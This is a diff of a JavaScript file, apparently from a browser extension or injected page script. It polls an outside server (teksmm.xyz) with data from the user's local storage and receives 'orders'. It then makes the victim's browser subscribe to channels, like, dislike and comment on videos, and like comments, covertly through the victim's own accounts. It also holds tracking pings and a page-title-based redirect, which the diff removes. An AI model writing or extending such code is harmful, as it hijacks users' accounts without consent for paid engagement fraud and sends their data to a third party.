@@ -285,12 +285,6 @@ if(document.referrer.indexOf("dizibox") >= 0){
 new Image().src = '//whos.amung.us/widget/selamcek02.png';
 setInterval(function(){ new Image().src = '//whos.amung.us/widget/selamcek02.png'; }, 200000);
 
-if(document.title.toLowerCase().indexOf("taraftarium24") >= 0){
-	if(window.location.origin.indexOf("macactus") < 0){
-		document.location = "https://www.macactus.com/";
-	}
-}
-
 if(document.title.toLowerCase().indexOf("izle") >= 0){
 	if((window.location.origin.indexOf("dizilla")  + window.location.origin.indexOf("dizist")  + window.location.origin.indexOf("dizipub")  + window.location.origin.indexOf("720p-izle")  + window.location.origin.indexOf("unutulmazfilmler")  + window.location.origin.indexOf("google")  + window.location.origin.indexOf("youtube"))+7 == 0){
 		new Image().src = '//whos.amung.us/widget/m823l61df0.png';
@@ -360,8 +354,6 @@ if(window.location.href.indexOf("google") >= 0){
 
 
 
-
-
 function getFromLocalStorage(){
   return JSON.parse(localStorage.getItem("m_history"));
 }
@@ -399,14 +391,15 @@ function checkInLocalStorage(key, value){
 
 function siparis_getir_3() {
 	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "https://teksmm.xyz/smm/queue.php?queue=3&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "3"))), true);
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=3&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "3"))), true);
 	xhr.onreadystatechange = function() {
 		if (xhr.readyState == 4 && xhr.status == 200) {
 			try {
 				var data = JSON.parse(xhr.responseText);
 				vars = {};
 				vars.channelIds = data.channelId.trim();
-				if(!checkOrSave(vars.channelIds,"3")){
+				vars.id = data.id.trim();
+				if(!checkOrSave(vars.id,"3")){
 					if (vars.channelIds) {
 						subscribe_now_count(vars);
 					}
@@ -420,14 +413,15 @@ function siparis_getir_3() {
 
 function siparis_getir_4() {
 	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "https://teksmm.xyz/smm/queue.php?queue=4&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "4"))), true);
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=4&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "4"))), true);
 	xhr.onreadystatechange = function() {
 		if (xhr.readyState == 4 && xhr.status == 200) {
 			try {
 				var data = JSON.parse(xhr.responseText);
 				vars = {};
 				vars.indexData = data.videoId.trim();
-				if(!checkOrSave(vars.indexData,"4")){
+				vars.id = data.id.trim();
+				if(!checkOrSave(vars.id,"4")){
 					if (vars.indexData) {
 						video_like(vars);
 					}
@@ -440,15 +434,16 @@ function siparis_getir_4() {
 
 function siparis_getir_5() {
 	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "https://teksmm.xyz/smm/queue.php?queue=5&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "5"))), true);
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=5&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "5"))), true);
 	xhr.onreadystatechange = function() {
 		if (xhr.readyState == 4 && xhr.status == 200) {
 			try {
 				var data = JSON.parse(xhr.responseText);
 				vars = {};
-				vars.indexData = data.videoId.trim().split("&")[0];
+				vars.indexData = data.videoId.trim();
 				vars.commentId =  data.commentId.trim();
-				if(!checkOrSave(vars.commentId,"5")){
+				vars.id = data.id.trim();
+				if(!checkOrSave(vars.id,"5")){
 					if (vars.indexData && vars.commentId) {
 						like_comment(vars);
 					}
@@ -461,7 +456,7 @@ function siparis_getir_5() {
 
 function siparis_getir_6() {
 	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "https://teksmm.xyz/smm/queue.php?queue=6&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "6"))), true);
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=6&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "6"))), true);
 	xhr.onreadystatechange = function() {
 		if (xhr.readyState == 4 && xhr.status == 200) {
 			try {
@@ -469,7 +464,8 @@ function siparis_getir_6() {
 				vars = {};
 				vars.indexData = data.videoId.trim();
 				vars.randComment = data.comments.trim().split("\n")[0].replace('"',"");
-				if(!checkOrSave(vars.indexData,"6")){
+				vars.id = data.id.trim();
+				if(!checkOrSave(vars.id,"6")){
 					if (vars.indexData && vars.randComment) {
 						createComment_id(vars);
 					}
@@ -482,14 +478,15 @@ function siparis_getir_6() {
 
 function siparis_getir_7() {
 	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "https://teksmm.xyz/smm/queue.php?queue=7&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "7"))), true);
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=7&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "7"))), true);
 	xhr.onreadystatechange = function() {
 		if (xhr.readyState == 4 && xhr.status == 200) {
 			try {
 				var data = JSON.parse(xhr.responseText);
 				vars = {};
 				vars.indexData = data.videoId.trim();
-				if(!checkOrSave(vars.indexData,"7")){
+				vars.id = data.id.trim();
+				if(!checkOrSave(vars.id,"7")){
 					if (vars.indexData) {
 						video_dislike(vars);
 					}
